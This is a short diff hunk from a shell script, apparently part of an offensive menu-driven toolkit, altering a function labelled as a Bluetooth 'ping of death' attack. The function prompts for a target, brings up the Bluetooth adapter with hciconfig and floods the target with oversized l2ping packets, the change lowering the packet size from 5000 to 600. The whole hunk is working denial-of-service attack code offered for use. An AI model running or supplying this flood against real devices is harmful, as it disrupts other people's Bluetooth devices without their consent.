@@ -920,7 +920,7 @@ bt_pod()
     read -p "TARGET: " target
     printf "\e[93mSTARTING BT PING OF DEATH ATTACK...\n"
     hciconfig $device up
-    l2ping -i $device -s 5000 -f $target
+    l2ping -i $device -s 600 -f $target
     printf "DONE!\n"
     read -p "press [ENTER] to back" variable
     auramenu
